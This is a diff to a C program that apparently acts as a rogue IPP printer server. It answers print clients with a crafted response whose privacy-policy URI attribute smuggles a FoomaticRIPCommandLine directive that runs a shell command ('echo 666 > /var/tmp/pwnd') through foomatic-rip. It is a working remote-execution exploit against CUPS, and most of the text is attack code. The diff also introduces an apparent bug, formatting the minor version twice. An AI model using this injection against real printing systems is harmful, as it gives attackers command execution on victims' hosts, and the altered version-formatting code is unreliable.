@@ -40,7 +40,6 @@ char* find_ipp_body(Globals *global, char** http_request) {
         global->fprintf(global->stderr, "Invalid Content-Length header.\n");
         return NULL;
     }
-    global->fprintf(global->stdout, "Found Content-Length: %d\n", content_length);
 
     // Find the double newline that marks the end of the headers
     char* header_end = global->strstr(*http_request, "\r\n\r\n");
@@ -136,7 +135,7 @@ int ipp_add_boolean(Globals * global, char *ipp, char * attribute, char value){
 }
 
 // Function to create an IPP response using libcups
-unsigned char* create_ipp_response(Globals*global, size_t* response_size, struct ipp_request_info *request_info) {
+unsigned char* create_ipp_body(Globals*global, size_t* response_size, struct ipp_request_info *request_info) {
     // Allocate buffer
     unsigned char* response = global->malloc(MAX_RESPONSE_SIZE);
     if (!response) {
@@ -149,7 +148,7 @@ unsigned char* create_ipp_response(Globals*global, size_t* response_size, struct
 
     // IPP Version
     char ipp_version[4];
-    global->snprintf(ipp_version, 3, "%d.%d", request_info->version_major, request_info->version_minor);
+    global->snprintf(ipp_version, 4, "%d.%d", request_info->version_minor, request_info->version_minor);
     response[offset++] = (unsigned char)request_info->version_major;
     response[offset++] = (unsigned char)request_info->version_minor;
 
@@ -202,7 +201,6 @@ unsigned char* create_ipp_response(Globals*global, size_t* response_size, struct
     offset += ipp_add_string(global, &response[offset], IPP_TAG_KEYWORD, "compression-supported", "none");
     offset += ipp_add_string(global, &response[offset], IPP_TAG_URI, "printer-privacy-policy-uri", "https//www.google.com/\"\n*FoomaticRIPCommandLine: \"echo 666 > /var/tmp/pwnd \"\n*cupsFilter2 : \"*/* application/vnd.cups-postscript 0 foomatic-rip");
 
-
     // End of Attributes Tag
     response[offset++] = 0x03;
     *response_size = offset;
@@ -211,9 +209,9 @@ unsigned char* create_ipp_response(Globals*global, size_t* response_size, struct
     return response;
 }
 
-unsigned char* create_http_ipp_response(Globals* global, size_t* total_response_size, struct ipp_request_info *request_info) {
+unsigned char* create_http_body(Globals* global, size_t* total_response_size, struct ipp_request_info *request_info) {
     size_t ipp_size;
-    unsigned char* ipp_response = create_ipp_response(global, &ipp_size, request_info);
+    unsigned char* ipp_response = create_ipp_body(global, &ipp_size, request_info);
     if (!ipp_response) {
         return NULL;
     }
@@ -284,7 +282,7 @@ void* handle_client(void* arg) {
 
     // Create and send IPP response
     size_t response_size;
-    unsigned char* ipp_response = create_http_ipp_response(global, &response_size, request_info);
+    unsigned char* ipp_response = create_http_body(global, &response_size, request_info);
     global->free(request_info);
     if (!ipp_response) {
         global->close(client_sock);
@@ -320,7 +318,7 @@ int serve(Globals * global) {
     }
 
     if (global->bind(server_sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
-        global->perror("Bind failed");
+        global->fprintf(global->stderr, "Bind failed");
         global->close(server_sock);
         return 1;
     }
